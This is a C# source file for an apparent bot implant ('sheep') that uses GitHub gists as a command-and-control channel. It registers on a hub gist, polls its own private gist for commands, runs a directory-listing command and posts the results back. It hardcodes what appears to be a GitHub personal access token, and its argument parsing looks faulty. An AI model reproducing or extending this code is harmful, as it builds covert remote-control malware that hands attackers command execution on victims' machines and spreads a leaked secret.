using Octokit;

namespace Sheep.Core;

public class SheepController
{
    private GitHubClient _client;
    private GistComment? _startingComment;
    private string _gistId;
    public string SheepId { get; private set; }

    private IDictionary<int, GistComment> _processedComments = new Dictionary<int, GistComment>();

    public SheepController(string sheepId)
    {
        SheepId = sheepId;
        _client = ConnectGitHubClient();
    }

    private GitHubClient ConnectGitHubClient()
    {
        var client = new GitHubClient(new ProductHeaderValue($"sheep"));
        var tokenAuth =
            new Credentials(
                "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");
        client.Credentials = tokenAuth;

        return client;
    }

    public async Task Start()
    {
        //Try to find existing hub gist
        var comments = await _client.Gist.Comment.GetAllForGist("652bac55c3f50e604c1882abbec27c27");

        foreach (var comment in comments)
        {
            var parts = comment.Body.Split("%");
            var commentSheepId = parts[0];
            var commentGistId = parts[1];

            if (commentSheepId == SheepId)
            {
                Console.WriteLine("Gist found!");
                _gistId = commentGistId;
                return;
            }
        }

        //Create new gist if not existing
        var newGist = new NewGist()
        {
            Public = false,
            Description = $"Sheep {SheepId}"
        };
        newGist.Files.Add("Dummy", "Dummy");

        var gist = await _client.Gist.Create(newGist);
        _gistId = gist.Id;

        _startingComment =
            await _client.Gist.Comment.Create("652bac55c3f50e604c1882abbec27c27", $"{SheepId}%{_gistId}");
    }

    public async Task End()
    {
        if (_startingComment != null)
            await _client.Gist.Comment.Delete("652bac55c3f50e604c1882abbec27c27", _startingComment.Id);
    }

    public async Task TryReceiveMessage()
    {
        var comments = await _client.Gist.Comment.GetAllForGist(_gistId);

        foreach (var comment in comments)
        {
            if (!_processedComments.TryGetValue(comment.Id, out var found))
            {
                _processedComments.Add(comment.Id, comment);
                await ProcessMessage(comment);
            }
        }
    }

    private async Task ProcessMessage(GistComment comment)
    {
        Console.WriteLine($"Received comment: {comment.Body}");
        var message = comment.Body;

        if (message.Contains("ls "))
        {
            Console.WriteLine("Executing ls");
            var response = await CommandExecutor.ExecuteCommandLs(message.Split("ls ")[0]);
            await _client.Gist.Comment.Create(_gistId, response);
        }
    }
}